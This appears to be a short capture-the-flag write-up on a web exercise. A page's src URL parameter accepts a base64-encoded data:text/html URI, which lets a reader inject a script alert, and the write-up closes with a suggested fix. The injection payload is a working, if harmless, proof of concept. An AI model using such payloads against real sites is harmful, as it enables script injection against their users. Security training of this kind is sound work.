# 09_Why_put_that_there
img src attribute can be changed from url as it is stored there

## Method
Go to ?page=media&src=nsa 

## How to exploit
Base64 encode a script:
<script>alert("Hello World")</script> -> base64 -> PHNjcmlwdD5hbGVydCgiSGVsbG8gV29ybGQiKTwvc2NyaXB0Pg==
change get param src
data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGVsbG8gd29ybGQiKTwvc2NyaXB0Pg==

## Solution
- use the src attribute of the img tag no need to store it in the url. If paths are an issue configure either a variable or the '/' path to point to the root of your web project.In this particular case just make a seperate page for each image that is needed